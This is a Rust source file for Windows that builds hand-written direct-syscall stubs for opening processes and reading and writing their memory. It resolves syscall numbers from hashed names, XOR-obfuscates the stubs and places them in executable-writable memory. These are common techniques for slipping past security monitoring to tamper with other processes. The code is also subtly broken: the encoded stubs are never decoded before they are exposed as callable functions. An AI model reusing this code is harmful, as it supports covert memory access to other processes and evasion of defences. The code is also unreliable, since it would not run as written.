use std::ffi::c_void;
use std::sync::OnceLock;

use windows_sys::Win32::System::Memory::{
    VirtualAlloc, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
};

pub const SYS64_TABLE: [(u64, u32); 3] = [
    (0x7c2ab5e5d6b9f1b1, 63),
    (0x9a1d23d8b9f4a112, 58),
    (0x61cfecf70f3d6d2d, 38),
];

#[repr(C)]
#[derive(Clone, Copy)]
pub struct clientId {
    pub uniqueProcess: *mut c_void,
    pub uniqueThread: *mut c_void,
}

#[repr(C)]
#[derive(Clone, Copy)]
pub struct objectAttributes {
    pub length: u32,
    pub rootDirectory: *mut c_void,
    pub objectName: *mut c_void,
    pub attributes: u32,
    pub securityDescriptor: *mut c_void,
    pub securityQualityOfService: *mut c_void,
}

pub type ntReadVirtualMemoryFn = unsafe extern "C" fn(
    processHandle: *mut c_void,
    baseAddress: *const c_void,
    buffer: *mut c_void,
    bufferSize: usize,
    bytesRead: *mut usize,
) -> i32;

pub type ntWriteVirtualMemoryFn = unsafe extern "C" fn(
    processHandle: *mut c_void,
    baseAddress: *mut c_void,
    buffer: *const c_void,
    bufferSize: usize,
    bytesWritten: *mut usize,
) -> i32;

pub type ntOpenProcessFn = unsafe extern "C" fn(
    processHandle: *mut *mut c_void,
    desiredAccess: u32,
    objectAttributes: *mut objectAttributes,
    clientId: *mut clientId,
) -> i32;

#[derive(Clone, Copy)]
pub struct stubs {
    pub readVirtualMemory: ntReadVirtualMemoryFn,
    pub writeVirtualMemory: ntWriteVirtualMemoryFn,
    pub openProcess: ntOpenProcessFn,
}

static STUBS: OnceLock<stubs> = OnceLock::new();

pub fn stubs() -> &'static stubs {
    STUBS.get().expect("syscall not initialized")
}

fn fnv1a64(input: &str) -> u64 {
    let mut hash = 0xcbf29ce484222325u64;
    for byte in input.bytes() {
        hash ^= byte as u64;
        hash = hash.wrapping_mul(0x100000001b3);
    }
    hash
}

fn resolve_syscall(name: &str) -> u32 {
    let hash = fnv1a64(name);
    SYS64_TABLE
        .iter()
        .find(|(candidate, _)| *candidate == hash)
        .map(|(_, ssn)| *ssn)
        .expect("unknown syscall hash")
}

fn encode_stub(mut stub: Vec<u8>, key: u8) -> Vec<u8> {
    for byte in &mut stub {
        *byte ^= key;
    }
    stub
}

fn build_stub(ssn: u32, key: u8) -> Vec<u8> {
    let mut stub = vec![
        0x4C, 0x8B, 0xD1, // mov r10, rcx
        0xB8, 0x00, 0x00, 0x00, 0x00, // mov eax, imm32
        0x0F, 0x05, // syscall
        0xC3, // ret
        0xCC, 0xCC, 0xCC, 0xCC,
    ];

    let ssn_bytes = ssn.to_le_bytes();
    stub[4] = ssn_bytes[0];
    stub[5] = ssn_bytes[1];
    stub[6] = ssn_bytes[2];
    stub[7] = ssn_bytes[3];

    encode_stub(stub, key)
}

fn install_stub(name: &str, key: u8) -> usize {
    let ssn = resolve_syscall(name);
    let encoded = build_stub(ssn, key);

    let page = unsafe {
        VirtualAlloc(
            std::ptr::null_mut(),
            4096,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };

    if page.is_null() {
        panic!("failed to allocate syscall page");
    }

    unsafe {
        std::ptr::copy_nonoverlapping(encoded.as_ptr(), page as *mut u8, encoded.len());
    }

    page as usize
}

pub fn initialize() {
    if STUBS.get().is_some() {
        return;
    }

    let read = install_stub("NtReadVirtualMemory", 0x7A);
    let write = install_stub("NtWriteVirtualMemory", 0x7A);
    let open = install_stub("NtOpenProcess", 0x7A);

    let stubTable = stubs {
        readVirtualMemory: unsafe {
            std::mem::transmute::<usize, ntReadVirtualMemoryFn>(read)
        },
        writeVirtualMemory: unsafe {
            std::mem::transmute::<usize, ntWriteVirtualMemoryFn>(write)
        },
        openProcess: unsafe {
            std::mem::transmute::<usize, ntOpenProcessFn>(open)
        },
    };

    let _ = STUBS.set(stubTable);
}
